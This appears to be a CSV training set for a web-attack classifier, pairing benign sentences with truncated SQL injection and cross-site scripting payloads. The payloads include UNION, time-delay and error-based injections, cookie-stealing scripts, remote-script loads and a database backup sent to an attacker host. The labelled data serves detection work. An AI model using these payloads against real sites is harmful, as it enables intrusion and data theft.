Payload,Label,text_label,ID
"1"" where 5039 = 5039 and char ( 111 ) ||char ( 77 ",2,SQLi,16774
"{""id"":null,""name"":""Probopass""}",0,normal,27368
"<acronym onkeydown=""alert(1)"" contenteditable>test",1,XSS,4850
"<thead onmousemove=""alert(1)"">test</thead>",1,XSS,8848
"<spacer onmouseenter=""alert(1)"">test</spacer>",1,XSS,4810
1%' ) ) ) or 4915 = ( select count ( * ) from doma,2,SQLi,21308
"<p draggable=""true"" ondragstart=""alert(1)"">test</p",1,XSS,6073
"<aside onkeydown=""alert(1)"" contenteditable>test</",1,XSS,8816
if I select,0,normal,26058
These are select peaches.,0,normal,25326
1 ) where 5550 = 5550 ( select ( case when ( 5451 ,2,SQLi,19739
-1866' ) ) as cwtv where 3295 = 3295 order by 1--,2,SQLi,17759
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10518
-1998' ) as kgvf where 2346 = 2346 union all selec,2,SQLi,13495
<link rel=import href=data:text/html&comma;&lt;scr,1,XSS,9685
"{""id"":null,""firstName"":""Kwee Buay"",""lastName"":""Low",0,normal,26930
"1%' or elt ( 5873 = 5873,sleep ( 5 ) ) #",2,SQLi,14335
"1%"" ) union all select null,null,null,null,null,nu",2,SQLi,13962
1' in boolean mode ) and ( select * from ( select ,2,SQLi,22283
select * from users where id = 1 + $+*\ union sele,2,SQLi,11493
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2247
Where's the ranch?,0,normal,23567
"-1076 union all select 3959,3959--",2,SQLi,13759
"1%"" ) ) and char ( 111 ) ||char ( 77 ) ||char ( 12",2,SQLi,16110
"A few sale items are available online, however: Th",0,normal,26439
1'|| ( select 'pmpd' where 9803 = 9803,2,SQLi,15105
1'|| ( select 'vekn' from dual where 4929 = 4929 a,2,SQLi,13156
"{""id"":null,""firstName"":""Chin Huat"",""lastName"":""Lim",0,normal,27068
"<image src=""javascript:alert(2)""> // IE6, O10.10â,",1,XSS,9205
"<style>@keyframes slidein {}</style><xss style=""an",1,XSS,4
-1304' ) union all select 7639#,2,SQLi,14502
"-4127%' union all select 9558,9558,9558#",2,SQLi,21535
"Mark Warner, vice chairman of the Senate Select Co",0,normal,25892
"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ",2,SQLi,13731
"<style>@keyframes slidein {}</style><xss style=""an",1,XSS,45
Let's decide where to go for our outing.,0,normal,23981
Select the ideal gift for a friend.,0,normal,24159
Order a delicious dessert.,0,normal,22753
"Previously, they were able to select up to five ou",0,normal,25764
He was later exonerated by the House Select Commit,0,normal,26110
"<progress ondblclick=""alert(1)"">test</progress>",1,XSS,7367
"1"" ) and ( 3020 = 3020 ) *6703 and ( ""qowc"" like """,2,SQLi,19356
"<map draggable=""true"" ondragstart=""alert(1)"">test<",1,XSS,3565
"<center onmousemove=""alert(1)"">test</center>",1,XSS,4483
"<hr onkeypress=""alert(1)"" contenteditable>test</hr",1,XSS,8031
Double Fun will screen in select theaters tonight ,0,normal,26230
x' OR full_name LIKE '%Bob%,2,SQLi,10194
"<section onmousemove=""alert(1)"">test</section>",1,XSS,7234
1 ) ) as hgtl where 3864 = 3864 and elt ( 3114 = 3,2,SQLi,17242
-3083 ) or 5221 = 7829,2,SQLi,18632
1 ) and exp ( ~ ( select * from ( select concat ( ,2,SQLi,13403
Yet the mile is run now only at select meets.,0,normal,25107
1 ) where 5385 = 5385 or 4411 = ( select count ( *,2,SQLi,16973
<style>:target {transform: rotate(180deg);}</style,1,XSS,3150
1'|| ( select 'fbsr' where 7899 = 7899 and elt ( 4,2,SQLi,15273
Report from the Select Committee on Acts respectin,0,normal,25753
1'+ ( select 'tmel' where 2655 = 2655 rlike ( sele,2,SQLi,21329
"-7514%"" ) ) ) or 2448 = 8797#",2,SQLi,20030
AND 1 = utl_inaddr.get_host_address ( ( SELECT DIS,2,SQLi,12071
1' ) waitfor delay '0:0:5',2,SQLi,17480
"<xss onclick=""alert(1)"" style=display:block>test</",1,XSS,55
"-9265"" ) or 7834 = 1685",2,SQLi,17027
1'+ ( select 'tjvt' where 2463 = 2463,2,SQLi,18170
"-6965' ) union all select 2857,2857,2857,2857,2857",2,SQLi,21939
-3209'+ ( select ldum where 9912 = 9912 union all ,2,SQLi,20793
"select pg_sleep ( 5 ) and ( ( ( ""wqeb"" = ""wqeb",2,SQLi,17470
"{""id"":null,""firstName"":""Kingston"",""lastName"":""Lim""",0,normal,26798
"<head draggable=""true"" ondragleave=""alert(1)"">test",1,XSS,5041
"<dir onmouseenter=""alert(1)"">test</dir>",1,XSS,7309
HAVING 1=0--,2,SQLi,10215
call regexp_substring ( repeat ( right ( char ( 23,2,SQLi,18499
"<area onmouseup=""alert(1)"">test</area>",1,XSS,3597
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10503
1' ) and sleep ( 5 ) and ( 'xecl' like 'xecl,2,SQLi,16129
-6766' ) ) ) or 3038 = 3038,2,SQLi,15840
"-5062"" ) ) ) union all select 4125,4125--",2,SQLi,22048
People can select a reason when they flag a video.,0,normal,25785
"1"" ) as kfvy where 7305 = 7305 or sleep ( 5 ) --",2,SQLi,21777
<style>:target {color: red;}</style><label id=x st,1,XSS,6123
"<script src=""javascript:alert(3)""></script> // IE6",1,XSS,9257
"<rt onmouseover=""alert(1)"">test</rt>",1,XSS,2530
1' in boolean mode ) and 8594 = ( select 8594 from,2,SQLi,15769
"1' and elt ( 4249 = 4249,7259 )",2,SQLi,21297
1 ) or 4411 = ( select count ( * ) from sysusers a,2,SQLi,16191
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10441
"1"" ) where 9680 = 9680 and ( select 2* ( if ( ( se",2,SQLi,20014
"1', ( convert ( int, ( select char ( 113 ) +char (",2,SQLi,17007
"{""id"":null,""firstName"":""Corinne"",""lastName"":""Chua""",0,normal,27097
"1"" ) ) ( select ( case when ( 5451 = 5451 ) then r",2,SQLi,21001
"javascript:/*""/*'/*`/*\""/*</script/</title/</texta",1,XSS,9503
"<div id=""123""><span class=foo>Some text</span>",1,XSS,9112
<track onpointerup=alert(1)>XSS</track>,1,XSS,3737
1' ) as ywtu where 3009 = 3009 or 4915 = ( select ,2,SQLi,12509
![a](javascript:prompt(document.cookie))\,1,XSS,9410
</title><script>alert(/xss/)</script>,1,XSS,1290
Insert the data.,0,normal,22888
<body>Hello</body>,1,XSS,9087
"<time oncut=""alert(1)"" contenteditable>test</time>",1,XSS,7658
"<div id=""89""><svg xmlns=""http://www.w3.org/2000/sv",1,XSS,9150
"<meta charset=""x-imap4-modified-utf7"">&ADz&AGn&AG0",1,XSS,715
Modify your account.,0,normal,22783
"1 ) ) ) union all select null,null,null,null,null,",2,SQLi,19583
1' and 4386 = utl_inaddr.get_host_address ( chr ( ,2,SQLi,20331
Select the finest wine.,0,normal,24468
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10522
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMA",2,SQLi,10679
<template onblur=alert(1) tabindex=1 id=x></templa,1,XSS,2366
Sort results where required.,0,normal,23334
"{""id"":null,""name"":""Herdier""}",0,normal,27296
"-3300' union all select 8979,8979,8979,8979,8979,8",2,SQLi,20333
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,1959
") or (1""=""1""#",2,SQLi,10000
<legend id=x tabindex=1 onbeforeactivate=alert(1)>,1,XSS,7288
"<svg onmouseover=""alert(1)"">test</svg>",1,XSS,8650
"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCR",1,XSS,1352
The Utilities Select Sector SPDR Fund (XLU) was up,0,normal,25360
"-6928"" ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( ",2,SQLi,21814
1'|| ( select 'zifu' from dual where 4822 = 4822 o,2,SQLi,13888
"<base oncontextmenu=""alert(1)"">test</base>",1,XSS,3275
"-9347' ) union all select 3884,3884#",2,SQLi,15165
&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt,1,XSS,1466
<mark onpointerenter=alert(1)>XSS</mark>,1,XSS,6636
1' ) or 5356 = ( select count ( * ) from sysusers ,2,SQLi,16909
<button onpointerenter=alert(1)>XSS</button>,1,XSS,7581
1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ),2,SQLi,21102
"1' ) ) union all select null,null,null,null,null,n",2,SQLi,15093
"Macy's didn't forget about the guys, either: they ",0,normal,25898
"At the bottom of the ""Overview"" page, select ""Dele",0,normal,26343
-2625' ) ) or 3038 = 3038,2,SQLi,15183
"1 ) ) ) procedure analyse ( extractvalue ( 9255,co",2,SQLi,12172
"<progress onmouseover=""alert(1)"">test</progress>",1,XSS,6070
1' in boolean mode ) and 5556 = ( select count ( *,2,SQLi,13786
-6567' ) ) union all select 3217#,2,SQLi,18269
"<map draggable=""true"" ondragenter=""alert(1)"">test<",1,XSS,5287
"<header onmousemove=""alert(1)"">test</header>",1,XSS,2709
<i onpointermove=alert(1)>XSS</i>,1,XSS,8014
<u onpointerout=alert(1)>XSS</u>,1,XSS,2587
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,8691
"1"" ) where 9020 = 9020 or row ( 1045,7562 ) > ( se",2,SQLi,16816
) or ('1â²='1â,2,SQLi,10002
1' where 9816 = 9816 and 7533 = 7533--,2,SQLi,17195
Read on to find out how to select a futon and the ,0,normal,25756
"1"" ) and 6510 = ( select count ( * ) from sysusers",2,SQLi,18004
"<image onkeydown=""alert(1)"" contenteditable>test</",1,XSS,4439
"{""id"":null,""name"":""dream""}",0,normal,27584
"<video onmousemove=""alert(1)"">test</video>",1,XSS,7223
1 ) as ktfu where 2637 = 2637,2,SQLi,20779
Select agree.,0,normal,24575
"<data onmouseleave=""alert(1)"">test</data>",1,XSS,8620
1 and 3754 = ( select upper ( xmltype ( chr ( 60 ),2,SQLi,17941
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#",2,SQLi,10546
<svg><sub onload=alert(1)></sub>,1,XSS,5053
"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a7",2,SQLi,20093
current,0,normal,23236
Merge the company divisions.,0,normal,22649
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,2543
"<head onclick=""alert(1)"">test</head>",1,XSS,8429
"-7482%"" ) ) or 1570 = convert ( int, ( select char",2,SQLi,12377
"<style>@keyframes x{}</style><input style=""animati",1,XSS,5051
"{""id"":null,""name"":""Mink""}",0,normal,27252
1'|| ( select 'ozki' where 4435 = 4435 ( select ( ,2,SQLi,13051
"<marquee onmouseleave=""alert(1)"">test</marquee>",1,XSS,4487
"select * from users where id = 1 or "";{"" or 1 = 1 ",2,SQLi,11963
"-5573' ) union all select 2866,2866,2866,2866,2866",2,SQLi,17985
"<style>@keyframes x{}</style><kbd style=""animation",1,XSS,8456
"1, ( case when 8260 = 8260 then 1 else null end )",2,SQLi,14771
"1"" ) where 2656 = 2656 or sleep ( 5 ) --",2,SQLi,13589
Where is the query stored?,0,normal,23376
"<center draggable=""true"" ondragenter=""alert(1)"">te",1,XSS,3579
"{""id"":null,""name"":""Bastiodon""}",0,normal,27436
"-3391' union all select 2024,2024--",2,SQLi,12313
<nextid id=x tabindex=1 onactivate=alert(1)></next,1,XSS,6026
<style>:target {transform: rotate(180deg);}</style,1,XSS,6328
<frame onpointerdown=alert(1)>XSS</frame>,1,XSS,6602
1) WAITFOR DELAY '0:0:5' AND (1337=1337,2,SQLi,11323
"<STYLE>li {list-style-image: url(""javascript:alert",1,XSS,2228
1 ) ) as mlpf where 7425 = 7425,2,SQLi,12542
1 ) and 9254 = ( select count ( * ) from rdb$field,2,SQLi,21276
-4900' ) ) or 7208 = 3236,2,SQLi,16293
<audio src=1 onerror=alert(1)>,1,XSS,1146
"{""id"":null,""name"":""air loose represent moving""}",0,normal,27575
1' ) as mgko where 1828 = 1828 and make_set ( 8403,2,SQLi,19998
"""'-function(){{{callback}}}()-"">\""><scrIpt>{callba",1,XSS,9486
""")))) and 0=benchmark(3000000,MD5(1))%20%23",2,SQLi,11051
"<xss oncopy=alert(1) value=""XSS"" autofocus tabinde",1,XSS,58
"1' and elt ( 4249 = 4249,7259 ) and 'nsbj' like 'n",2,SQLi,18313
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay",2,SQLi,10902
"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a474",2,SQLi,21789
"<blink onmouseleave=""alert(1)"">test</blink>",1,XSS,3289
"{""id"":null,""name"":""very put direct""}",0,normal,27509
-2909'|| ( select 'qfeq' where 7062 = 7062 union a,2,SQLi,22022
"-9082 union all select 9858,9858,9858,9858,9858,98",2,SQLi,21415
Insert the new batteries.,0,normal,22733
"1%"" ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",2,SQLi,16006
"1%"" union all select null,null,null,null,null,null",2,SQLi,22044
<details onfocusout=alert(1) tabindex=1 id=x></det,1,XSS,5362
"<a href=""\x05javascript:javascript:alert(1)"" id=""f",1,XSS,492
"<style>@keyframes x{}</style><xmp style=""animation",1,XSS,6331
-3096' or 3821 = 5539 and 'zrth' = 'zrth,2,SQLi,12587
1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) |,2,SQLi,13800
<image/src/onerror=prompt(8)>,1,XSS,346
"-4205' ) or 1570 = convert ( int, ( select char ( ",2,SQLi,17557
"""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",2,SQLi,10953
<svg><code onload=alert(1)></code>,1,XSS,2940
"1"" ) and 8148 = like ( 'abcdefg',upper ( hex ( ran",2,SQLi,20974
"This quarter, the categories are gas stations and ",0,normal,25296
1%' ) rlike sleep ( 5 ) #,2,SQLi,16812
1' ) and 8312 = dbms_pipe.receive_message ( chr ( ,2,SQLi,17959
<style>:target {color:red;}</style><sup id=x style,1,XSS,6894
;%5waitfor%5delay%5'0:0:5'%5--%5,2,SQLi,11310
"1%"" or 8156 = ( select count ( * ) from generate_s",2,SQLi,16133
<footer onpointerover=alert(1)>XSS</footer>,1,XSS,6292
Always try to select the appropriate newsgroup for,0,normal,26383
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10451
With a texture like wood you can use the eye dropp,0,normal,25115
select ( case when ( 9103 = 9836 ) then 9103 else ,2,SQLi,19809
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar,1,XSS,863
The service is only available for select clients a,0,normal,25377
"<em draggable=""true"" ondragenter=""alert(1)"">test</",1,XSS,6866
1' ) as yyyb where 1705 = 1705 and ( 8770 = 6988 ),2,SQLi,13140
"<output onkeydown=""alert(1)"" contenteditable>test<",1,XSS,8067
1%' ) or 2633 = dbms_pipe.receive_message ( chr ( ,2,SQLi,17855
javascript:alert()//<frame/src=javascript:alert()>,1,XSS,9535
"<th onmouseup=""alert(1)"">test</th>",1,XSS,8577
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,1,XSS,879
<source onpointerup=alert(1)>XSS</source>,1,XSS,2460
The Melting Pot will randomly select a winner on M,0,normal,25410
foo<script>alert(1)</script>,1,XSS,940
"<noscript draggable=""true"" ondragenter=""alert(1)"">",1,XSS,6242
"<noscript onmousedown=""alert(1)"">test</noscript>",1,XSS,5456
<rt onfocusout=alert(1) tabindex=1 id=x></rt><inpu,1,XSS,4151
Select race.,0,normal,24710
Select your control.,0,normal,24873
"1%' ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d4",2,SQLi,17962
1'|| ( select 'goxu' where 9215 = 9215 and char ( ,2,SQLi,15016
I'm planning to pick up some groceries.,0,normal,23904
"</title><script>$=1,\u0061lert($)</script>",1,XSS,9462
"<SCRIPT a=`>` SRC=""httx://.rocks/.js""></SCRIPT>",1,XSS,5723
"Products you select on a PC will show up here, too",0,normal,25761
"<input onclick=""alert(1)"">test</input>",1,XSS,6763
select * from users where id = 1 + ( \+ ) union se,2,SQLi,11810
Select your iCloud account in the pane on the left,0,normal,25567
-6081 where 3681 = 3681 or 2603 = 3138--,2,SQLi,16518
AND 1=utl_inaddr.get_host_address((SELECT COUNT(DI,2,SQLi,11076
1' in boolean mode ) procedure analyse ( extractva,2,SQLi,17549
"<xss onkeypress=""alert(1)"" contenteditable style=d",1,XSS,73
><ScRiPt>alert(document.cookie)</script>,1,XSS,1733
"<keygen onmouseenter=""alert(1)"">test</keygen>",1,XSS,8508
1'|| ( select 'dfmw' from dual where 1723 = 1723,2,SQLi,22369
"1"" where 3510 = 3510",2,SQLi,14973
"<tbody draggable=""true"" ondragenter=""alert(1)"">tes",1,XSS,1810
AND 1=utl_inaddr.get_host_address((SELECT DISTINCT,2,SQLi,11108
BACKUP database master to disks='\\<attackerip>\<a,2,SQLi,10037
"1"" where 5477 = 5477",2,SQLi,19231
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,6580
"To view the video clips, the site requires the use",0,normal,25248
Users can also manually select people they want to,0,normal,25195
"1"" and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 11",2,SQLi,15421
"{""id"":null,""name"":""Binacle""}",0,normal,26940
"-1305 ) or make_set ( 2298 = 5545,5545 ) and ( 671",2,SQLi,14098
"<IMG SRC=x onmouseover=""alert(String.fromCharCode(",1,XSS,1203
`>ABC<div style=font-family:'foo'\x7Dx:expression(,1,XSS,450
"1"" ) where 6903 = 6903",2,SQLi,20915
1'+ ( select eztr where 4260 = 4260 and 6537 = dbm,2,SQLi,18395
<svg><shadow onload=alert(1)></shadow>,1,XSS,5225
)) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) A,2,SQLi,11196
"<big ondblclick=""alert(1)"">test</big>",1,XSS,3792
select * from users where id = 1 + ( $+ ) union se,2,SQLi,11966
"1' ) ) ) procedure analyse ( extractvalue ( 9255,c",2,SQLi,21190
-9405' union all select 2539--,2,SQLi,14949
Select your agreement.,0,normal,24948
1%' ) and 9198 = 9198--,2,SQLi,17789
<br onpointerup=alert(1)>XSS</br>,1,XSS,4917
<svg><multicol onload=alert(1)></multicol>,1,XSS,2908
"-1040 where 3058 = 3058 union all select 3058,3058",2,SQLi,18439
"<main onbeforepaste=""alert(1)"" contenteditable>tes",1,XSS,8860
"1' ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76",2,SQLi,21089
1' ) as zdhq where 5586 = 5586,2,SQLi,19550
"-7794"" ) union all select 3910,3910,3910,3910,3910",2,SQLi,12541
"1"" where 9760 = 9760 or 4240 = ( select 4240 from ",2,SQLi,15576
"select * from users where id = 1 or "" ( #"" or 1 = ",2,SQLi,11561
<;BODY ONLOAD=alert(';XSS';)>;,1,XSS,1586
1' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( ,2,SQLi,18703
select * from users where id = 1 *1 union select n,2,SQLi,11446
<dfn onpointerenter=alert(1)>XSS</dfn>,1,XSS,4113
<style>:target {color:red;}</style><object id=x st,1,XSS,7378
<svg><kbd onload=alert(1)></kbd>,1,XSS,6431
"1' and 3202 = like ( 'abcdefg',upper ( hex ( rando",2,SQLi,19437
"<acronym onpaste=""alert(1)"" contenteditable>test</",1,XSS,1942
"1%"" ) and 8407 = ( select count ( * ) from generat",2,SQLi,15561
<script>navigation.navigate('javascript:alert(1)'),1,XSS,170
"<element oncontextmenu=""alert(1)"">test</element>",1,XSS,2831
Where's the police station?,0,normal,23509
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,5475
select,0,normal,26588
Where's the mosque?,0,normal,23530
"<div style=""xg-p:absolute;top:0;left:0;width:100%;",1,XSS,931
<img onpointerup=alert(1)>XSS</img>,1,XSS,5138
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,20236
Where's the reiki practitioner?,0,normal,23648
"<;IMG SRC=javascript:alert(String.fromCharCode(88,",1,XSS,1634
-2951 or 4189 = 2291,2,SQLi,15339
1%' ) order by 1--,2,SQLi,12192
"1' ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( ",2,SQLi,21061
Select the colors.,0,normal,22847
The Lovers and the Despot is now playing in select,0,normal,25415
"and 1=( if((load_file(char(110,46,101,120,11 ...",2,SQLi,10108
"1"" ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( ",2,SQLi,15297
"{""id"":null,""name"":""Mesprit""}",0,normal,27406
Join the discussion.,0,normal,22779
"<noscript onkeypress=""alert(1)"" contenteditable>te",1,XSS,3428
"<param onkeyup=""alert(1)"" contenteditable>test</pa",1,XSS,6961
<script>function x(window) { eval(location.hash.su,1,XSS,9292
select ( case when ( 8841 = 9675 ) then 8841 else ,2,SQLi,16450
<td onfocusout=alert(1) tabindex=1 id=x></td><inpu,1,XSS,3505
1' ) as ekjw where 5477 = 5477 union all select nu,2,SQLi,12134
"<iframe onmousedown=""alert(1)"">test</iframe>",1,XSS,8150
"<STYLE>BODY{-moz-binding:url(""http://.rocks/moz.xm",1,XSS,3049
Choose a frame style by clicking the selector butt,0,normal,26288
1 ) as iknl where 3885 = 3885 rlike sleep ( 5 ) #,2,SQLi,18072
select sleep ( 5 ) and ( ( 3404 = 3404,2,SQLi,14325
"select count ( * ) from generate_series ( 1,500000",2,SQLi,22463
<audio id=x tabindex=1 ondeactivate=alert(1)></aud,1,XSS,3444
"<var draggable=""true"" ondrag=""alert(1)"">test</var>",1,XSS,6627
AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGI,2,SQLi,11069
Update your travel plans for the trip.,0,normal,22964
<col onfocusout=alert(1) tabindex=1 id=x></col><in,1,XSS,5336
<fieldset onfocusout=alert(1) tabindex=1 id=x></fi,1,XSS,3957
"<b onmousemove=""alert(1)"">test</b>",1,XSS,6811
"1' ) union all select null,null,null#",2,SQLi,20084
"That's why we have elections, why we democraticall",0,normal,25488
1%' ) ) or ( select 9173 from ( select count ( * ),2,SQLi,22186
Insert the plug.,0,normal,22848
"-9676 or elt ( 1032 = 1032,3623 ) # jcaq",2,SQLi,17534
"<spacer onbeforecut=""alert(1)"" contenteditable>tes",1,XSS,2580
"-3415 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( ",2,SQLi,17906
<param onpointermove=alert(1)>XSS</param>,1,XSS,8729
<style>:target {color:red;}</style><xss id=x style,1,XSS,47
<b <script>alert(1)</script>0,1,XSS,639
1 ) ) as nnpe where 9720 = 9720 union all select n,2,SQLi,16242
"-4513"" ) ) ) or 4144 = ( select upper ( xmltype ( ",2,SQLi,21908
))))) waitfor delay '0:0:20' --,2,SQLi,10933
1' ) as mqxb where 6496 = 6496 and 7533 = 7533--,2,SQLi,13644
select case when 3252 = 9622 then 1 else null end-,2,SQLi,14434
"The Industrial Select Sector SPDR Fund, which trac",0,normal,25425
1' in boolean mode ) or 4915 = ( select count ( * ,2,SQLi,21289
"<noembed onkeyup=""alert(1)"" contenteditable>test</",1,XSS,1849
1 ) as agex where 8167 = 8167 and 3824 = benchmark,2,SQLi,19790
`'><script>\xE2\x80\x89javascript:alert(508)</scri,1,XSS,8983
"<style>@keyframes x{}</style><strong style=""animat",1,XSS,3915
"1%"" union all select null#",2,SQLi,16281
Select your purpose.,0,normal,24842
"1' ) or 8384 = like ( 'abcdefg',upper ( hex ( rand",2,SQLi,20627
select two people in the office.,0,normal,25574
